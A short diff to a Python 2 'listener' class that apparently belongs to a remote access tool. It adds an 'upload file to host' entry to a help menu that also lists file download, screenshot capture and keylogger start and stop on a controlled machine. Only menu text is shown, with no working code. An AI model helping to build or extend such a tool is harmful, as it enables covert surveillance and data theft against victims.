@@ -31,6 +31,7 @@ class listener(object):
                     print "admins for administrators.\nusers for users.\nwhelp for windows help.\n"
                     print "getFile(url to file) for download file from web."
                     print "download(path to file) for download file from host."
+                    print "upload(path to file) for upload file to host."
                     print "screenshot for create screenshot.\n"
                     print "keylogger start for start keylogger."
                     print "keylogger stop for stop keylogger."
